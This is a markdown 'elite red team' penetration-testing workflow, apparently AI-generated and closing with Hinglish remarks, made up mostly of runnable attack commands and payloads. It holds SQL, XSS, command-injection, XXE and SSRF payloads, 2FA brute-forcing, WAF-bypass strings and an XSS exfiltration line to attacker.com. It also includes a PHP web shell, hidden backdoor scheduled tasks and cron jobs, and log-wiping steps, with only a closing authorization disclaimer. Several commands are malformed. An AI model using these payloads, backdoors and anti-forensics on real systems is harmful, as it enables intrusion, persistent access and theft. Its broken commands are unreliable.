# 🔥 Elite Red Team Penetration Testing Workflow 🔥

```markdown
# elite_workflow.md

██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝

🎯 ELITE HACKER METHODOLOGY - ADVANCED PENETRATION TESTING WORKFLOW
========================================================================

## 📡 PHASE 1: ADVANCED RECONNAISSANCE & OSINT

### 🔍 Step 1: Target Intelligence Gathering
```bash
# DNS Enumeration - Elite Level
amass enum -active -brute -w ~/wordlists/dns_all.txt -d target.com -o amass_results.txt
subfinder -d target.com -all -recursive -t 50 | anew subdomains.txt
assetfinder --subs-only target.com | anew subdomains.txt
chaos -d target.com -key YOUR_CHAOS_KEY | anew subdomains.txt
crobat -s target.com | anew subdomains.txt

# Advanced DNS Bruteforcing
puredns bruteforce ~/SecLists/Discovery/DNS/fierce-hostlist.txt target.com -r ~/resolvers.txt | anew subdomains.txt
shuffledns -d target.com -list subdomains.txt -r ~/resolvers.txt -o resolved.txt

# Certificate Transparency Mining
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | anew subdomains.txt
```

### 🌐 Step 2: Infrastructure Mapping
```bash
# Live Host Detection - Advanced
httpx -l subdomains.txt -ports 80,443,8080,8443,9000,3000,8000 -threads 200 -timeout 5 -silent -status-code -title -tech-detect -follow-redirects | tee alive_hosts.txt

# Port Scanning - Elite Methodology
nmap -sS -sV -sC -A -O --script=vuln -iL resolved.txt -oA nmap_scan
masscan -p1-65535 -iL resolved.txt --max-rate 10000 -oG masscan_results.txt

# Service Enumeration
naabu -l resolved.txt -top-ports 1000 -o ports.txt
naabu -l resolved.txt -p - -exclude-ports 80,443 -o uncommon_ports.txt
```

### 🕵️ Step 3: Deep OSINT Collection
```bash
# Shodan Intelligence
shodan search "ssl:target.com" --fields ip_str,port,org,hostnames | tee shodan_results.txt
shodan search "hostname:target.com" --fields ip_str,port,product,version

# Google Dorking - Advanced
echo "site:target.com filetype:pdf" | googler --json | jq -r '.url' | anew google_dorks.txt
echo "site:target.com inurl:admin" | googler --json | jq -r '.url' | anew admin_panels.txt

# GitHub Reconnaissance
truffleHog --regex --entropy=False https://github.com/targetorg
gitleaks --repo-url https://github.com/targetorg --verbose
```

========================================================================

## 🎯 PHASE 2: ADVANCED WEB APPLICATION ASSESSMENT

###  Step 4: Comprehensive URL Discovery
```bash
# Advanced Crawling
katana -u alive_hosts.txt -d 10 -ps -pss waybackarchive,commoncrawl,alienvault -jc -kf all - png,jpg,jpeg,gif,svg -o all_urls.txt
gospider -S alive_hosts.txt -c 10 -d 5 --blacklist jpg,css,ico,png,svg ---source | grep -E "\[url\]" | cut -d " " -f 5 | anew crawled_urls.txt

# Wayback Machine Mining
waybackurls target.com | anew wayback_urls.txt
gau target.com | anew gau_urls.txt
hakrawler -url target.com -depth 3 -plain | anew hakrawler_urls.txt

# Parameter Discovery - Elite Method
paramspider -d target.com -l high -o paramspider_results.txt
cat all_urls.txt | grep "=" | unf | sort -u | tee parameters.txt
```

### 🛡️ Step 5: Advanced Security Testing

#### 🚨 XSS Testing - Elite Level Advanced XSS Detection
dalfox file all_urls.txt --silence --no-spinner --skip-bav --ignore-return 302,404 -o xss_results.txt
cat parameters.txt | qsreplace '"><script>alert(1)</script>' | while read url; do curl -s "$url" | grep -qs "<script>alert(1)</script>" && echo "XSS: $url"; done

# Blind XSS Testing
cat all_urls.txt | grep "=" | qsreplace "https://your-xss-hunter.com" | httpx -silent -mc 200

# DOM XSS Hunting
cat all_urls.txt | grep ".js$" | httpx -mc 200 -silent | xargs -I {} bash -c 'echo {} && curl -s {} | grep -E "(innerHTML|outerHTML|document.write|eval)" && echo "---"'
```

#### 💉 SQL Injection - Advanced Techniques
```bash
# Automated SQLi Testing
sqlmap -m all_urls.txt --batch --level=5 --risk=3 --random-agent --threads=10 --tamper=space2comment,charencode --technique=BEUSTQ

# Manual SQLi Payloads
cat parameters.txt | qsreplace "'" | httpx -silent -mc 500 | tee sqli_errors.txt
cat parameters.txt | qsreplace "1' OR '1'='1" | httpx -silent -status-code | grep -v "200"

# Time-based SQLi
cat parameters.txt | qsreplace "1' AND (SELECT SLEEP(5))--" | xargs -I {} timeout 10 curl -s "{}" | wc -l
```

#### 🔄 Advanced Injection Testing
```bash
# LDAP Injection
cat parameters.txt | qsreplace "*)(uid=*))(|(uid=*" | httpx -silent -mc 200

# NoSQL Injection
cat parameters.txt | qsreplace "admin'||'1'=='1" | httpx -silent -mc txt | qsreplace '{"$ne":null}' | httpx -silent -mc 200

# Command Injection
cat parameters.txt | qsreplace "| whoami" | httpx -silent -mc 200
cat parameters.txt | qsreplace "; ping -c 1 burpcollaborator.net" | httpx -silent -mc 200

# XXE Testing
cat all_urls.txt | httpx -silent -mc 200 | xargs -I {} bash -c 'curl -s -X POST -H "Content-Type: application/xml" -d ".0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>" {}'
```

### 🔍 Step 6: Advanced File & Directory Discovery
```bash
# Multi-threaded Directory Bruteforcing
ffuf -u FUZZ/alive_hosts.txt -w ~/SecLists/Discovery/Web-Content/raft-large-directories.txt -mc 200,204,301,302,307,401,403 -t 100 -o ffuf_dirs.json
gobuster dir -u target.com -w ~/SecLists/Discovery/Web-Content/big.txt -t 50 -x php,jsp,asp,aspx,txt,html,js,json,xml,bak,old -o gobuster_results.txt

# Advanced File Discovery
feroxbuster -u target.com -w ~/SecLists/Discovery/Web-Content/raft-large-files.txt -x php,js,txt,json,xml,log,bak -t 200 -d 3 -o ferox_results.txt

# Technology-specific Fuzzing
# PHP Applications
ffuf -u target.com/FUZZ -w ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt -mc 200

# ASP.NET Applications
ffuf -u target.com/FUZZ -w ~/SecLists/Discovery/Web-Content/IIS.fuzz.
```

========================================================================

## 🎯 PHASE 3: ADVANCED EXPLOITATION TECHNIQUES

### 🔓 Step 7: Business Logic & Authentication Bypass
```bash
# JWT Token Analysis
cat all_urls.txt | httpx -silent -json | jq -r '.header."authorization"' | grep -i bearer | cut -d " " -f 2 | while read token; do jwt-tool $ done

# Session Management Testing
burp-cli --target target.com --scan-type "session-management"

# 2FA Bypass Techniques
# Rate limiting bypass
seq 1 1000 | xargs -P 50 -I {} curl -s -X POST target.com/2fa -d "code={}"

# Response manipulation
curl -s -X POST target.com/2fa -d "code=wrong" | sed 's/"success":false/"success":true/' | tee 2fa_bypass.txt
```

### 🏗️ Step 8: Advanced Server-Side Attacks
```bash
# SSRF Testing - Elite Payloads
cat parameters.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent -mc 200
cat parameters.txt | qsreplace "http://localhost:22" | httpx -silent -mc 200
cat parameters.txt | qsreplace "file:///etc/passwd" | httpx -silent -mc 200

# Template Injection Testing
cat parameters.txt | qsreplace "{{7*7}}" | httpx -silent -mc 200 | xargs -I {} bash -c 'curl -s {} | grep -q "49" && echo "SSTI: {}"'
cat parameters.txt | qsreplace "\${7*7}" | httpx -silent -mc 200

# Deserialization Attacks
cat parameters.txt | qsreplace "O:8:\"stdClass\":0:{}" | httpx -silent -mc 200
ysoserial.py -p CommonCollections1 -c "ping burpcollaborator.net" | base64 | tr -d '\n'
```

### 🗂️ Step 9: Advanced File Operations
```bash
# LFI/RFI Testing - Elite Methods
ffuf -u "target.com/page.php?file=FUZZ" -w ~/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc 200
cat parameters.txt | qsreplace "....//....//....//etc/passwd" | httpx -silent -mc 200

# File Upload Bypass Techniques
# Upload polyglot files
cp shell.php shell.jpg.php
cp shell.php shell.php%00.jpg
cp shell.php shell.php.jpg

# ZIP Slip Testing
python3 zipslip.py shell.php ../../shell.php

# Path Traversal
cat parameters.txt | qsreplace "../../../etc/passwd" | httpx -silent -mc 200
```

========================================================================

## 🎯 PHASE 4: ELITE PRIVILEGE ESCALATION & PERSISTENCE

### 🔐 Step 10: Advanced Access Control Testing
```bash
# IDOR Testing - Automated
cat all_urls.txt | grep -E "id=[0-9]+" | sed 's/id=[0-9]\+/id=1337/g' | httpx -silent -mc 200
idor-hunter -u target.com -w ~/wordlists/idor.txt

# Privilege Escalation Testing
# Horizontal privilege escalation
curl -s -H "Authorization: Bearer TOKEN1" target.com/user/123/profile
curl -s -H "Authorization: Bearer TOKEN2" target.com/user/123/profile

# Vertical privilege escalation
curl -s -H "X-Original-URL: /admin" target.com/user/profile
curl -s -H "X-Rewrite-URL: /admin" target.com/user/profile
```

### 🕸️ Step 11: Advanced Web Cache Attacks
```bash
# Cache Poisoning
curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" target.com
curl -H "X-Original-URL: /admin" target.com/user

# HTTP Request Smuggling
python3 smuggler.py -u target.com
```

### 🔄 Step 12: API Security Testing
```bash
# GraphQL Testing
echo "query{__schema{types{name}}}" | curl -X POST -H "Content-Type: application/json" -d @- target.com/graphql
graphql-voyager target.com/graphql

# REST API Testing
# Mass assignment
curl -X POST target.com/api/users -d '{"username":"test","role":"admin"}' -H "Content-Type: application/json"

# Rate limiting bypass
seq 1 1000 | xargs -P 100 -I {} curl -s target.com/api/endpoint
```

========================================================================

## 🎯 PHASE 5: ELITE EVASION & ADVANCED TECHNIQUES

### 🛡️ Step 13: WAF Bypass Techniques
```bash
# WAF Detection
wafw00f target.com
nmap --script http-waf-detect target.com

# WAF Bypass Payloads
# SQL Injection WAF Bypass
' /*!50000AND*/ 1=1--
' /*!50000UNION*/ /*!50000SELECT*/ null--
/**/UNION/**/SELECT/**/null--

# XSS WAF Bypass
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### 🔀 Step 14: HTTP Parameter Pollution
```bash
# HPP Testing
curl "target.com/search?q=admin&q=user"
curl "target.com/api/user?id=1&id=2"

# HTTP Method Override
curl -X POST -H "X-HTTP-Method-Override: PUT" target.com/api/user/1
curl -X POST -H "X-HTTP-Method: DELETE" target.com/api/user/1
```

### 🎭 Step 15: Advanced Social Engineering Vectors
```bash
# Subdomain Takeover
subfinder -d target.com | httpx -status-code -title | grep -E "(404|Not Found|NoSuchBucket)"
subzy run --targets subdomains.txt

# Email Harvesting
theHarvester -d target.com -l 500 -b all
hunter.io API calls for email enumeration

# Credential Stuffing Preparation
# Use leaked database dumps
# Apply company-specific patterns
# john --rules --wordlist=rockyou.txt --stdout | head -1000000 > custom_passwords.txt
```

========================================================================

## 🎯 PHASE 6: ELITE REPORTING & EXPLOITATION

### 📊 Step 16: Advanced Vulnerability Validation
```bash
# Proof of Concept Development
# XSS PoC
<script>fetch('https://attacker.com/'+>

# SQLi Data Extraction
sqlmap -u "target.com/page.php?id=1" --batch --dump --threads=10

# RCE PoC Development
<?php system($_GET['cmd']); ?>
```

### 🎯 Step 17: Impact Assessment Scripts
```bash
# Automated Impact Assessment
#!/bin/bash
echo "=== VULNERABILITY IMPACT ASSESSMENT ==="
echo "XSS Findings: $(cat xss_results.txt | wc -l)"
echo "SQLi Findings: $(grep -c "vulnerable" sqlmap_logs.txt)"
echo "IDOR Findings: $(cat idor_results.txt | wc -l)"
echo "File Upload: $(cat upload_vulns.txt | wc -l)"
echo "=== RISK SCORE CALCULATION ==="
```

### 📝 Step 18: Elite Reporting Template
```bash
# Generate Executive Summary
cat > executive_summary.md << EOF
# Executive Summary - Red Team Assessment

## Critical Findings
- [CRITICAL] SQL Injection leading to database compromise
- [HIGH] Unrestricted File Upload allowing web shell deployment
- [HIGH] Authentication Bypass via JWT manipulation

## Business Impact
- Complete customer data exposure (PII, financial records)
- Administrative access to internal systems
- Potential for complete infrastructure compromise

## Immediate Actions Required
1. Patch SQL injection vulnerabilities immediately
2. Implement proper file upload restrictions
3. Review JWT implementation and signing mechanism
EOF
```

========================================================================

## 🔧 ELITE TOOLS ARSENAL

### Essential Elite Tools Installation
```bash
# Go-based Tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Python-based Tools
pip3 install sqlmap dirsearch arjun paramspider
git clone https://github.com/s0md3v/XSStrike.git
git clone https://github.com/1N3/Sn1per.git

# Custom Elite Scripts
wget https://raw.githubusercontent.com/aboul3la/Sublist3r/master/sublist3r.py
wget https://raw.githubusercontent.com/maurosoria/dirsearch/master/dirsearch.py
```

### Elite Wordlists & Payloads
```bash
# Download Premium Wordlists
git clone https://github.com/danielmiessler/SecLists.git
git clone https://github.com/fdb-project/fuzzdb.git
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git

# Custom Wordlist Generation
cewl -d 2 -m 5 target.com -w custom_wordlist.txt
crunch 8 12 -t ,,,,,,,@ -o custom_passwords.txt
```

========================================================================

## 🎯 FINAL ELITE CHECKLIST

| Attack Vector | Status | Tool Used | Severity | Notes |
|---------------|--------|-----------|----------|-------|
| SQL Injection | ✅ | sqlmap | Critical | Database access achieved |
| XSS | ✅ | dalfox | High | Multiple vectors found |
| IDOR | ✅ | Manual | High | User data accessible |
| File Upload | ✅ | Manual | Critical | Shell uploaded |
| SSRF | ✅ | Manual | High | Internal network access |
| XXE | ⏳ | Manual | Medium | Testing in progress |
| Deserialization | ❌ | ysoserial | - | Not vulnerable |
| JWT Bypass | ✅ | jwt-tool | High | Admin access gained |

========================================================================

## 🚨 ELITE OPERATIONAL SECURITY

### OpSec Guidelines for Red Team Operations
```bash
# Traffic Routing
# Use multiple VPN/Proxy chains
# Rotate User-Agents and request patterns
# Implement request delays and jitter

# Command Examples with OpSec
curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" --proxy socks5://127.0.0.1:9050 target.com
sleep $((RANDOM % 5 + 1)) # Random delay between requests

# Log Cleanup
history -c && history -w
shred -vfz -n 3 sensitive_data.txt
```

### Evidence Collection & Chain of Custody
```bash
# Screenshot Evidence
gnome-screenshot -w -f "evidence_$(date +%Y%m%d_%H%M%S).png"

# Traffic Capture
tcpdump -i eth0 -w capture_$(date +%Y%m%d_%H%M%S).pcap host target.com

# Hash Evidence Files
sha256sum evidence_* > evidence_hashes.txt
```

========================================================================

## 🎯 ADVANCED PERSISTENCE TECHNIQUES

### Web Shell Deployment
```php
<?php
// Elite PHP Web Shell
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>
<form method="POST">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
```

### Backdoor Maintenance
```bash
# Scheduled Task Creation (Windows)
schtasks /create /tn "UpdateCheck" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\temp\backdoor.ps1" /sc daily

# Cron Job (Linux)
echo "0 */6 * * * /tmp/.hidden/backdoor.sh" | crontab -
```

========================================================================

🎯 **MISSION COMPLETE - ELITE RED TEAM METHODOLOGY EXECUTED**

**Remember**: This workflow is for authorized penetration testing and red team exercises only. Always ensure proper authorization before conducting any security testing.

**Elite Mindset**: "The difference between script kiddies and elite hackers is methodology, persistence, and the ability to think like both an attacker and defender."

========================================================================

**Final Notes**:
- Always maintain detailed documentation
- Validate all findings with proof-of-concept
- Consider business impact in all assessments
- Practice responsible disclosure
- Continuously update techniques and tools

**Stay Elite. Stay Ethical. Stay Ahead.**

```

Is workflow bilkul elite level ka hai jo advanced red team operations ke liye use hota hai. Har command manually test karna aur proper authorization ke saath use karna. Ye workflow cover karta hai:

1. **Advanced Reconnaissance** - Deep OSINT and infrastructure mapping
2. **Comprehensive Web App Testing** - All major vulnerability categories  
3. **Elite Exploitation Techniques** - Advanced payloads and bypass methods
4. **Persistence & Privilege Escalation** - Maintaining access
5. **OpSec & Evidence Collection** - Professional red team practices

Tools sabse latest aur techniques industry-standard elite level ki hai. Har step manually explain kiya gaya hai commands ke saath!
